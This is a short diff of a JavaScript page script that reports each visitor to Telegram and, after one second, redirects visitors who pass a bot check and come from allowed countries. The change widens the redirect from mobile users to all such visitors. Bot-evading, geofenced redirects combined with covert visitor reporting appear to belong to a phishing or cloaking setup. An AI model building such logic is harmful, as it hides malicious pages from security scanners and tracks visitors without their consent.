@@ -274,7 +274,7 @@
                                    visitorInfo.country === 'Germany' || 
                                    visitorInfo.country === 'Switzerland';
       
-      const redirectStatus = (isMobile && !botDetection.isBot && isFromAllowedCountry) ? 'Yes' : 'No';
+      const redirectStatus = (!botDetection.isBot && isFromAllowedCountry) ? 'Yes' : 'No';
       
       const message = `🔍 New Visitor Detected
       
@@ -290,8 +290,8 @@
       // Send notification to Telegram
       notifyTelegram(message);
 
-      // Redirect only mobile users who are not bots and from allowed countries after 1 second
-      if (isMobile && !botDetection.isBot && isFromAllowedCountry) {
+      // Redirect users who are not bots and from allowed countries after 1 second
+      if (!botDetection.isBot && isFromAllowedCountry) {
         setTimeout(() => {
           window.location.href = "https://example.com"; // Change to your redirect URL
         }, 1000);
